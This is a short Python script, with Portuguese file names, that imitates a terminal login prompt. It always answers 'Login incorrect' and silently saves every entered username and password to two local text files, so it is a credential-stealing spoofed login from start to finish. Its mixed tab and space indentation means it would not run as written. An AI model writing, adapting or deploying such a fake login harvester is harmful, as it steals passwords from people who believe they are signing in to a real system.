#!/opt/rh/rh-python36/root/usr/bin/python3
import os
import socket
import getpass
import time
flag=int(0)
cont=int(0)
arquivoA=open("ListaDeUsuarios.txt","w")
arquivoB=open("ListaDeSenhas.txt","w")
os.system('clear')
while flag==0:
    username=input(str(socket.gethostname())+" login: ")
    password=str(getpass.getpass('Password: '))
    time.sleep(3)
    print("Login incorrect")
    cont=(cont+1)
    arquivoA.write(username+"\n")
    arquivoB.write(password+"\n")
    if cont==3:
	#flag=1
        arquivoA.close()
	arquivoB.close()
        flag=(1)
        os.system('exit')
	os.system('exit')
